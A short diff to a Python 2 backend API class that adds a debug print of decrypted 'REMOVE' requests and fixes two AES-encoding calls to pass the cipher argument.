@@ -90,6 +90,8 @@ class BackendAPI:
 						api_fcn = dec_req.split(' ???? ')[0]
 						api_req = dec_req.split(" ???? ")[1]
 						print '[*] %s is requesting to %s' % (username, api_fcn)
+						if api_fcn == 'REMOVE':
+							print dec_req
 						# known fcn run it 
 						if api_fcn in self.actions.keys():
 							client = self.actions[api_fcn](client, client_info, api_req, username)
@@ -240,9 +242,9 @@ class BackendAPI:
 		try:
 			if proxy_endpt in self.known_clients:
 				self.proxy_mapping[client] = [ci[0], proxy_endpt, proxy_port]
-				c.send(utils.EncodeAES('Proxy Flag Set for: %s:%s' % (proxy_endpt, proxy_port)))
+				c.send(utils.EncodeAES(cipher, 'Proxy Flag Set for: %s:%s' % (proxy_endpt, proxy_port)))
 			else:
-				c.send(utils.EncodeAES('Unknown Client %s, cannot set proxy flag' % proxy_endpt))
+				c.send(utils.EncodeAES(cipher, 'Unknown Client %s, cannot set proxy flag' % proxy_endpt))
 		except socket.error:
 			print '[!!] Connection Error'
 			pass
